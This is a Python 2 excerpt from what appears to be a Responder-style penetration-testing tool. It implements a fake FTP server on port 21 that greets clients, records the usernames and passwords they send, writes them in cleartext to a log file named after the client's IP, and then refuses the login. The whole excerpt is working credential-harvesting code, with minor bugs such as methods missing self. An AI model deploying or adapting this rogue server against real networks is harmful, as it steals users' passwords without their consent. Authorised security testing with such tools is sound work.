##################################################################################
#FTP Stuff starts here
##################################################################################

class FTPServer():

	def serve_thread_tcp(host, port, handler):
		try:
			server = ThreadingTCPServer((host, port), handler)
			server.serve_forever()
		except Exception, e:
			print "Error starting TCP server on port %s: %s:" % (str(port),str(e))

	#Function name self-explanatory
	def start(FTP_On_Off):
		if FTP_On_Off == "ON":
			t = threading.Thread(name="FTP", target=self.serve_thread_tcp, args=("0.0.0.0", 21, FTP))
			t.setDaemon(True)
			t.start()

		if FTP_On_Off == "OFF":
			return False

class ThreadingTCPServer(ThreadingMixIn, TCPServer):

	allow_reuse_address = 1

	def server_bind(self):
		TCPServer.server_bind(self)

class FTPPacket(Packet):
	fields = OrderedDict([
		("Code",           "220"),
		("Separator",      "\x20"),
		("Message",        "Welcome"),
		("Terminator",     "\x0d\x0a"),
	])

#FTP server class.
class FTP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(str(FTPPacket()))
			data = self.request.recv(1024)
			if data[0:4] == "USER":
				User = data[5:].replace("\r\n","")
				#print "[+]FTP User: ", User
				responder_logger.info('[+]FTP User: %s'%(User))
				t = FTPPacket(Code="331",Message="User name okay, need password.")
				self.request.send(str(t))
				data = self.request.recv(1024)
			if data[0:4] == "PASS":
				Pass = data[5:].replace("\r\n","")
				Outfile = "./logs/responder/FTP-Clear-Text-Password-"+self.client_address[0]+".txt"
				WriteData(Outfile,User+":"+Pass, User+":"+Pass)
				#print "[+]FTP Password is: ", Pass
				responder_logger.info('[+]FTP Password is: %s'%(Pass))
				t = FTPPacket(Code="530",Message="User not logged in.")
				self.request.send(str(t))
				data = self.request.recv(1024)
			else :
				t = FTPPacket(Code="502",Message="Command not implemented.")
				self.request.send(str(t))
				data = self.request.recv(1024)
		except Exception:
			pass

##################################################################################
#FTP Stuff ends here
##################################################################################